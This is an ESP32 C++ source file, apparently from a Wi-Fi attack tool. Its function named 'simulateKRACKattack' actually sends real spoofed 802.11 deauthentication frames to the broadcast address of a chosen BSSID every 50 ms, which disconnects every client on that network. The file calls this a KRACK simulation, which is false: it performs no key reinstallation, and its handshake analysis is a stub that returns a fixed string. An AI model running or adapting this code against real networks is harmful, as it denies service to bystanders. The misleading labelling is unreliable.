#include "wifi_krack.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace WiFiKRACK {

static bool attacking = false;
static uint32_t deauthsSent = 0;

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) DeauthFrame;

KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t durationMs) {
    KrackResult result{false, bssid, channel, "", ""};

    if (!TxArm::isArmed()) {
        result.error = "TX arming required";
        return result;
    }

    attacking = true;
    deauthsSent = 0;

    Serial.println("KRACK Attack simulation started");
    Serial.println("Target BSSID: " + bssid);
    Serial.println("Channel: " + String(channel));

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint32_t startTime = millis();
    uint32_t deadline = startTime + durationMs;

    // Validate BSSID format once and parse it upfront
    if (bssid.length() != 17) {  // "AA:BB:CC:DD:EE:FF" = 17 chars
        Serial.println("Error: Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)");
        result.error = "Invalid BSSID format";
        return result;
    }

    uint8_t parsedBSSID[6];
    int n = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &parsedBSSID[0], &parsedBSSID[1], &parsedBSSID[2],
        &parsedBSSID[3], &parsedBSSID[4], &parsedBSSID[5]);

    if (n != 6) {
        Serial.println("Error: Failed to parse BSSID");
        result.error = "Invalid BSSID format";
        return result;
    }

    // Use safe timeout comparison (handles millis() wraparound)
    while ((int32_t)(millis() - deadline) < 0 && attacking && TxArm::isArmed()) {
        DeauthFrame frame;
        frame.frame_control = 0xc0;
        frame.duration = 0;
        frame.seq_ctrl = (esp_random() % 4096) << 4;
        frame.reason_code = 7;

        memcpy(frame.bssid, parsedBSSID, 6);
        memset(frame.da, 0xff, 6);
        memcpy(frame.sa, frame.bssid, 6);

        esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false);
        deauthsSent++;

        delay(50);
    }

    attacking = false;

    result.success = true;
    result.status = "KRACK simulation - " + String(deauthsSent) + " deauth frames sent";

    Serial.println(result.status);

    return result;
}

String analyzeHandshakes() {
    return "Handshake analysis: KRACK vulnerability simulation active";
}

} // namespace WiFiKRACK
